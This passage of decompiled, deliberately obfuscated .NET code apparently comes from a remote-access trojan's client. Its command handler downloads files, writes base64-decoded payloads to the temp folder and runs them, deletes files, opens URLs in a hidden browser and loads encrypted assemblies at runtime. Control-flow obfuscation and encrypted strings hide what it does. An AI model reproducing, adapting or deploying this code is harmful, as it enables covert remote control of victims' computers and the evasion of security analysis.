						if (Operators.CompareString(string0, <Module>.__________((int)(sizeof(short) + 36928), ((num14 << 8) / 44135206 == -1367350965 ? Type.EmptyTypes.Length + -695418064 : 39081), Type.EmptyTypes.Length + 27), false) != 0)
						{
							________________________________________________ _________________________ = new ________________________________________________()
							{
								_ = string_0
							};
							thread = new Thread(new ThreadStart(_________________________._));
						}
						else if (length * -1799094272 != 4896)
						{
							obj = sizeof(float) + 42;
							continue;
						}
						else
						{
							obj = sizeof(short) + -2088112801;
							continue;
						}
						thread.Start();
						return;
					}
				Label11:
				}
			}
			catch (Exception exception1)
			{
				ProjectData.SetProjectError(exception1);
				Exception exception = exception1;
				______________________________________________________________.______________(<Module>._____<string>(-1723325216), string.Concat(<Module>._______<string>(-69734094), exception.ToString()));
				ProjectData.ClearProjectError();
			}
			return;
		Label0:
			string str5 = _____________________________________________________________________.____(strArrays1[1]);
			if (Operators.CompareString(str5, <Module>.____<string>(372314799), false) == 0)
			{
				goto Label11;
			}
			num13 = length;
			length = 14451;
			if (43 * num6 + 85 * num6 != 974290426)
			{
				if (num13 == 31326)
				{
					____________________.___________(strArrays1[1]);
					return;
				}
			}
			______________________________________________________________.___________(string.Concat(<Module>._______<string>(987635703), str5, <Module>.______<string>(861631917)));
			if (length == 21896)
			{
				if (((~((1874150872 & _________2) - 1875) ^ 5309) & 3) == 3)
				{
					______________________________________________________________.___________(string.Concat(<Module>.____<string>(-1335102124), ___________________.______(strArrays1[1]), <Module>.___<string>(-1617572493)));
					return;
				}
			}
			return;
			return;
		Label6:
			length = 18041;
			if (Operators.CompareString(str3, <Module>._____<string>(-67791790), false) == 0)
			{
				num13 = length;
				length = -10388;
				int _________4 = <Module>._________________;
				if (~(239968 * _________4 * 1024) != _________4 * -818380800)
				{
					if (num13 == -9253)
					{
						goto Label63;
					}
				}
				_________________________________________________._______(Convert.ToInt32(strArrays1[1]), true);
				return;
			}
			else if (Operators.CompareString(str3, <Module>.______<string>(2020288334), false) != 0)
			{
				if (Operators.CompareString(str3, <Module>.____<string>(-1721089001), false) == 0)
				{
					goto Label62;
				}
				if (Operators.CompareString(str3, <Module>.______<string>(601139745), false) != 0)
				{
					goto Label26;
				}
				length = 18882;
				if ((num2 % 8388608 != -968465429 ? (int)(sizeof(double) + 15559) : (int)(sizeof(long) + 1539912851)) == 15567)
				{
					goto Label59;
				}
				goto Label60;
			}
			else
			{
				length = Type.EmptyTypes.Length + -31430;
				if ((________1 * -3902 | -2) != -2)
				{
					obj = Type.EmptyTypes.Length + -1988886178;
					goto Label61;
				}
				else if (~(-(num8 / 32) * 32768) != 495 * num8 + num8 * 529)
				{
					obj = Type.EmptyTypes.Length + 68;
					goto Label61;
				}
				else
				{
					num2 = ___________._;
					if ((num2 / 12083 / 734276768 & 9504) == 0)
					{
						obj = sizeof(double) + 1985526931;
						goto Label61;
					}
					else
					{
						obj = sizeof(byte) + -1445419117;
						goto Label61;
					}
				}
			}
		Label63:
			str1 = strArrays1[1];
			if (Operators.CompareString(str1, <Module>._____<string>(-1118000365), false) == 0)
			{
				goto Label64;
			}
		Label15:
			if (File.Exists(str1))
			{
				File.Delete(str1);
			}
			strArrays = Strings.Split(string_0, <Module>.______<string>(1992654500), -1, CompareMethod.Binary);
			length = -4608;
			if (((-(1001702944 & num3) ^ 6115) == 0 ? (int)(sizeof(Guid) + -1828326325) : Type.EmptyTypes.Length + -30838) != -26334)
			{
				goto Label65;
			}
			return;
			_________________________________________________________________._ = strArrays1[1];
			return;
			return;
		Label16:
			______________________________________________________________.________________________ = strArrays1[1];
			__________________________________________________________________._____(<Module>._______<string>(1334981879), strArrays1[1]);
			obj = Type.EmptyTypes.Length + 24;
			goto Label61;
			return;
		Label21:
			string[] strArrays2 = Strings.Split(string_0, <Module>.______<string>(-1787157645), -1, CompareMethod.Binary);
			File.WriteAllText(str2, strArrays2[1]);
			Process.Start(str2);
			______________________________________________________________.______________(<Module>.____<string>(-899364305), string.Concat(<Module>._______<string>(-1020237685), str2));
			goto Label11;
			return;
		Label24:
			____________________.______(strArrays1[1], strArrays1[2]);
			obj = Type.EmptyTypes.Length + 20;
			goto Label61;
		Label26:
			length = 1082;
			if (Operators.CompareString(str3, <Module>._____<string>(1940347355), false) == 0)
			{
				goto Label66;
			}
			if (Operators.CompareString(str3, <Module>.______<string>(-788410399), false) == 0)
			{
				goto Label24;
			}
			if (Operators.CompareString(str3, <Module>._____<string>(-966645575), false) == 0)
			{
				goto Label67;
			}
			length = -10530;
			if (4194304 * (num11 / 65536) == -2063827376)
			{
				goto Label21;
			}
			if (Operators.CompareString(str3, <Module>.______<string>(1187344092), false) != 0)
			{
				goto Label11;
			}
			if (length != -2056)
			{
				goto Label60;
			}
		Label27:
			(new Thread(new ThreadStart(____________________._))).Start();
			if (length != -23421)
			{
				return;
			}
		Label59:
			if (Operators.CompareString(______________________________________________________________._________________, <Module>.___<string>(-649094980), false) == 0)
			{
				______________________________________________________________.______________(<Module>.______<string>(-1639100780), <Module>.___<string>(736611324));
				return;
			}
			else
			{
				length = (int)(sizeof(byte) + -26221);
				obj = sizeof(float) + 56;
				goto Label61;
			}
		Label46:
			length = -4496;
			if (sizeof(int) + 18018 == 18022)
			{
				if (!strArrays1[1].Contains(______________________._____))
				{
					goto Label11;
				}
				____________________.___________(strArrays1[1]);
				if (length != -4496)
				{
					return;
				}
				else if (((3423 & num4) - -8064 ^ 16784287) != 0)
				{
					return;
				}
				else
				{
					return;
				}
			}
			else
			{
				____________________._____(strArrays1[1], strArrays1[2]);
				if (length == -651)
				{
					return;
				}
				____________________.__________(strArrays1[1]);
				return;
			}
		Label60:
			Random random1 = new Random();
			string tempPath1 = Path.GetTempPath();
			num3 = random1.Next(1000, 9000);
			str2 = string.Concat(tempPath1, num3.ToString(), <Module>.____<string>(-1612109391), strArrays1[1]);
			goto Label21;
		Label62:
			length = 14084;
			if ((-7801 | 816447488 * (num7 % 5515)) != -7801)
			{
				______________________.________(strArrays1[1]);
				return;
			}
			else
			{
				goto Label63;
			}
		Label64:
			length = (int)(sizeof(float) + 30911);
			int ________3 = <Module>.______________;
			if ((________3 % 32 / 16 & 1) != (________3 >> 4 & 1))
			{
				goto Label71;
			}
			obj = Type.EmptyTypes.Length + 35;
			goto Label61;
		Label65:
		Label74:
			File.WriteAllBytes(str1, Convert.FromBase64String(strArrays[1]));
			obj = Type.EmptyTypes.Length + 53;
			goto Label61;
		Label66:
			if (length != 1082)
			{
				_________________________________________________________________._ = strArrays1[1];
				return;
			}
			else
			{
				goto Label16;
			}
		Label67:
			length = -18374;
			if (~(num4 * 335544320 >> 19) == ________ << 5)
			{
				return;
			}
			if (Operators.CompareString(______________________________________________________________._________________, <Module>._______<string>(1177340789), false) == 0)
			{
				______________________________________________________________.______________(<Module>.______<string>(-1639100780), <Module>._____<string>(327195795));
				return;
			}
			else
			{
				num13 = length;
				length = -5259;
				if (num13 != -18374)
				{
					thread4.Start();
					return;
				}
				__________________________________________________________________._____(<Module>.____<string>(728687342), <Module>._______<string>(1673631998));
				______________________________________________________________.______________(<Module>._______<string>(1670293721), <Module>.____<string>(176132015));
				if (2224 + num1 % 3027795 != 1739871977)
				{
					if (length == -1144)
					{
						goto Label74;
					}
					return;
				}
				else
				{
					return;
				}
			}
		}
	}

	public static void ______________________(string string_0)
	{
		byte[] numArray = null;
		try
		{
			if (14807 == Type.EmptyTypes.Length + 14807)
			{
				string str = string.Concat(______________________.____, ______________________________________________________________._______________________, <Module>.___<string>(697590686));
				if (!File.Exists(str))
				{
					if (Type.EmptyTypes.Length + 15368 != -6984)
					{
						byte[] numArray1 = (new WebClient()).DownloadData(string_0);
						numArray = ___________________________________________________________________._______(numArray1, <Module>.____<string>(251397721));
					}
					byte[] numArray2 = ________________________________________________________________________________.______(numArray);
					if (checked((int)numArray2.Length) != 82438)
					{
						___________._ = -1932913121;
						______________________________________________________________.______________(<Module>.____<string>(1187660804), <Module>.______<string>(-508142837));
						return;
					}
					else
					{
						File.WriteAllBytes(str, ___________________________________________________________________._______(numArray2, <Module>.__________((int)(sizeof(short) + 29789), Type.EmptyTypes.Length + 29140, Type.EmptyTypes.Length + 185)));
					}
				}
			}
			_______________________________________________._ = true;
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			Exception exception = exception1;
			______________________________________________________________.______________(<Module>._______<string>(-1937358506), string.Concat(<Module>._______<string>(1592812621), exception.ToString()));
			ProjectData.ClearProjectError();
		}
	}

	private static Assembly _______________________(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		bool[] flagArray;
		object[] objectValue;
		int num = 0;
		object[] objArray;
		Assembly assembly = null;
		Array arrays = null;
		object[] objectValue1;
		object[] objArray1;
		int length;
		object obj;
		try
		{
			if (<Module>._________________ * 618624 != -1581)
			{
				AssemblyName assemblyName = new AssemblyName(resolveEventArgs_0.Name);
				if (assemblyName.Name.Contains(<Module>.____<string>(2102967365)))
				{
					if (Type.EmptyTypes.Length + 30647 == 30647)
					{
						goto Label3;
					}
					goto Label2;
				}
				else if (!_______________________________________________._)
				{
					return assembly;
				}
				else
				{
					byte[] numArray = File.ReadAllBytes(string.Concat(______________________.____, ______________________________________________________________._______________________, <Module>.___<string>(697590686)));
					if (2077229056 * num * (num % 8192) != -7802)
					{
						length = 22952;
					}
					else if (3473 + (num - 9987 | 67 * num + num * 61) != ~num)
					{
						length = Type.EmptyTypes.Length + 1026787821;
					}
					else if ((-3 | num * 3 + num - 2636) != -3)
					{
						length = Type.EmptyTypes.Length + -1225301400;
					}
					else if (num * 779 + num * 245 != -1746265770)
					{
						length = Type.EmptyTypes.Length + -1729275948;
					}
					else
					{
						length = ((-(1073740712 & <Module>._______________) ^ 7228) == 0 ? checked((int)-1950083533) : Type.EmptyTypes.Length + -1359128622);
					}
					arrays = _____________________________.____________(___________________________________________________________________._______(numArray, <Module>.__________(length, Type.EmptyTypes.Length + 24312, (int)(sizeof(short) + 197))), <Module>._____<string>(-651045367));
					if (Type.EmptyTypes.Length + -22118 == 12434)
					{
						goto Label3;
					}
					objArray1 = new object[] { 0 };
					byte[] numArray1 = (byte[])NewLateBinding.LateIndexGet(arrays, objArray1, null);
					obj = sizeof(int) + -2;
					goto Label1;
				}
			Label3:
				byte[] numArray2 = ___________________________________________________________________._______(__________________________________________________________________________.______, <Module>.___<string>(-2004095234));
				assembly = Assembly.Load(________________________________________________________________________________.______(numArray2));
				obj = Type.EmptyTypes.Length + 1;
			Label1:
				while (true)
				{
					switch (obj)
					{
						case 0:
						{
							if (!assemblyName.Name.ToLower().Contains(<Module>.____<string>(1033029822)))
							{
								goto Label5;
							}
							obj = Type.EmptyTypes.Length + 3;
							continue;
						}
						case 2:
						{
							objArray1 = new object[] { 1 };
							byte[] numArray3 = (byte[])NewLateBinding.LateIndexGet(arrays, objArray1, null);
							obj = sizeof(ushort) + -2;
							continue;
						}
						case 3:
						{
							break;
						}
						default:
						{
							goto Label2;
						}
					}
				}
				Type type = typeof(Assembly);
				string str = <Module>.___<string>(-1681536895);
				objectValue = new object[1];
				objArray1 = new object[1];
				num = 0;
				objArray1[0] = 0;
				objectValue[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(arrays, objArray1, null));
				objArray = objectValue;
				flagArray = new bool[] { true };
				object obj1 = NewLateBinding.LateGet(null, type, str, objArray, null, null, flagArray);
				if (flagArray[0])
				{
					objectValue1 = new object[] { num, RuntimeHelpers.GetObjectValue(objArray[0]) };
					NewLateBinding.LateIndexSetComplex(arrays, objectValue1, null, true, false);
				}
				assembly = (Assembly)obj1;
				return assembly;
			}
		Label2:
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
		return assembly;
	Label5:
		Type type1 = typeof(Assembly);
		string str1 = <Module>.______<string>(131364567);
		objArray = new object[1];
		objectValue1 = new object[1];
		num = 1;
		objectValue1[0] = 1;
		objArray[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(arrays, objectValue1, null));
		objectValue = objArray;
		flagArray = new bool[] { true };
		object obj2 = NewLateBinding.LateGet(null, type1, str1, objectValue, null, null, flagArray);
		if (flagArray[0])
		{
			objArray1 = new object[] { num, RuntimeHelpers.GetObjectValue(objectValue[0]) };
			NewLateBinding.LateIndexSetComplex(arrays, objArray1, null, true, false);
		}
		assembly = (Assembly)obj2;
		return assembly;
	}

	public static void ________________________(string string_0, string string_1, string string_2)
	{
		bool[] flagArray = null;
		object[] string0 = null;
		int ____;
		int num = 0;
		int length = 0;
		int num1 = 0;
		int ________ = 0;
		int length1;
		object obj;
		int length2;
		try
		{
			____ = ______________________._______;
			if ((5245 | -926941184 * ____ * 2013265920) == 5245)
			{
				string string1 = string_1;
				if (Operators.CompareString(string1, <Module>._______<string>(587536482), false) != 0)
				{
					if (Operators.CompareString(string1, <Module>._______<string>(-1477788344), false) == 0)
					{
						goto Label4;
					}
					if (Operators.CompareString(string1, <Module>._______<string>(642309030), false) != 0)
					{
						if (Operators.CompareString(string1, <Module>.___<string>(-410813858), false) != 0)
						{
							goto Label0;
						}
						length = -26473;
						if ((-805306369 | ____ / 16 ^ 1388) != -805306369)
						{
							goto Label1;
						}
					}
					else
					{
						length = 26953;
						if ((52 & (num * 1048576 >> 3 ^ -(2204416 * num))) != 0)
						{
							int ________1 = <Module>._______________;
							length2 = (________1 * 290 + 1758 * ________1 == -5240 ? Type.EmptyTypes.Length + -1115912675 : (int)(sizeof(short) + -1444927161));
						}
						else
						{
							length2 = Type.EmptyTypes.Length + -31435;
						}
						if (length2 == 28852)
						{
							goto Label1;
						}
						goto Label2;
					}
				}
				else
				{
					obj = sizeof(float) + -2;
					goto Label3;
				}
			}
		Label10:
			(new WebClient()).DownloadString(string_0);
			goto Label0;
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			Exception exception = exception1;
			______________________________________________________________.______________(<Module>.______<string>(-820038095), string.Concat(<Module>.______<string>(-563410505), exception.ToString()));
			ProjectData.ClearProjectError();
		}
		return;
	Label0:
		______________________________________________________________.______________(<Module>.___<string>(982404538), string.Concat(<Module>._______<string>(-2099656647), string_0));
		length = -18512;
		if (253820928 * ________ == 1686)
		{
			if ((1996488704 & ________ / 562) == 0)
			{
				goto Label6;
			}
			length1 = Type.EmptyTypes.Length + 1329576031;
			goto Label5;
		}
	Label6:
		int _______ = <Module>._____________;
		if (_______ + -4933 == _______ % 2)
		{
			length1 = (int)(sizeof(double) + -2146986324);
		}
		else
		{
			length1 = ((24144 ^ (____ | -7605) * 385024) == 0 ? Type.EmptyTypes.Length + -401140455 : Type.EmptyTypes.Length + -26473);
		}
	Label5:
		if (length1 != -2794)
		{
			goto Label7;
		}
	Label2:
		object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(<Module>.____<string>(-1410367830), <Module>.__________((int)(sizeof(int) + 10488), (int)(sizeof(ushort) + 11883), Type.EmptyTypes.Length + 114)));
		__________________________________.____________ = <Module>.__________(Type.EmptyTypes.Length + 36861, Type.EmptyTypes.Length + 38415, Type.EmptyTypes.Length + 0);
		object obj1 = objectValue;
		length = -20261;
		if ((7 * num1 + num1 | -5) == -5)
		{
			string str = <Module>._____<string>(-894678162);
			string0 = new object[] { string_0 };
			flagArray = new bool[] { true };
			NewLateBinding.LateCall(obj1, null, str, string0, null, null, flagArray, true);
			num = length;
			length = -8397;
			if (num == -20261)
			{
				________ = <Module>._______________;
				if ((2 & 3 * ________ + ________ & ________) == (-(________ << 7) >> 2 & 2))
				{
					goto Label9;
				}
				goto Label8;
			}
			else
			{
				goto Label8;
			}
		}
	Label9:
		if (flagArray[0])
		{
			string_0 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(string0[0]), typeof(string));
			if (length == -8397)
			{
				goto Label11;
			}
			goto Label10;
		}
	Label11:
		string str1 = <Module>.______<string>(770871971);
		string0 = new object[] { false };
		NewLateBinding.LateSet(obj1, null, str1, string0, null, null);
		obj = Type.EmptyTypes.Length + 1;
	Label3:
		switch (obj)
		{
			case 0:
			{
				goto Label8;
			}
			case 1:
			{
				goto Label0;
			}
		}
	Label1:
		Process.Start(string_0);
		goto Label0;
	Label4:
		length = Type.EmptyTypes.Length + 30416;
		obj = Type.EmptyTypes.Length + 0;
		goto Label3;
	Label7:
		if (Operators.CompareString(string_2, <Module>.____<string>(744724380), false) == 0)
		{
			if (length != -18512)
			{
				goto Label10;
			}
			while (num1 < 100)
			{
				num1++;
				_____________________________________________________________ _______________________________ = new _____________________________________________________________();
				______________________________________________________________.SendMessageW(_______________________________.Handle, 793, _______________________________.Handle, (IntPtr)589824);
			}
		}
		return;
	Label8:
		WebBrowser webBrowser = new WebBrowser()
		{
			ScriptErrorsSuppressed = true
		};
		webBrowser.Navigate(string_0);
		if (length == 30416)
		{
			goto Label0;
		}
		goto Label0;
	}

	[DebuggerStepThrough]
	private static void ___________________________(object sender, ElapsedEventArgs e)
	{
		_____________________________________________________________________________._();
	}

	[DebuggerStepThrough]
	private static void ____________________________(object sender, ElapsedEventArgs e)
	{
		______________________________________________________________.________();
	}

	[DebuggerStepThrough]
	private static void _____________________________(object sender, UnhandledExceptionEventArgs e)
	{
		______________________________________________________________.____________________();
	}

	[DebuggerStepThrough]
	private static void ______________________________()
	{
		_________________________________________________.___();
	}

	[DllImport("user32.dll", CharSet=CharSet.None, ExactSpelling=false)]
	public static extern IntPtr SendMessageW(IntPtr intptr_0, int int_0, IntPtr intptr_1, IntPtr intptr_2);

	[DllImport("kernel32.dll", CharSet=CharSet.None, ExactSpelling=false)]
	public static extern uint SetThreadExecutionState(uint uint_0);

	private static event ______________________________________________________________._______________________________________________________________ _
	{
		add
		{
			______________________________________________________________.______ += value;
		}
		remove
		{
			______________________________________________________________.______ -= value;
		}
	}

	private delegate void _______________________________________________________________(string string_0);

	internal class ________________________________________________________________
	{
		public ______________________________________________________________________ _;

		public ________________________________________________________________()
		{
		}

		[DebuggerStepThrough]
		public void _()
		{
			this._.ShowDialog();
		}
	}
}